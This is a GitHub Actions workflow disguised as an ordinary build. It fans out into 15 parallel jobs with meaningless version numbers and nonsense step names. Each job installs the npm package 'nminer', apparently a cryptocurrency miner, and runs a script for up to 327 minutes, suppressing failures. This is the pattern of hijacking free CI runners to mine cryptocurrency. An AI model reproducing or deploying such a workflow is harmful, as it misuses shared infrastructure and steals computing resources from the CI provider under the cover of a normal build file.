name: step-mother
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7468 }
          - { version: 8153 }
          - { version: 5109 }
          - { version: 7445 }
          - { version: 5404 }
          - { version: 4252 }
          - { version: 9078 }
          - { version: 915 }
          - { version: 4059 }
          - { version: 321 }
          - { version: 850 }
          - { version: 7374 }
          - { version: 6507 }
          - { version: 632 }
          - { version: 389 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: that wherever boohoo too
        run: |
          npm install nminer@latest
          timeout 327m node step-mother.js || echo "step-mother executed"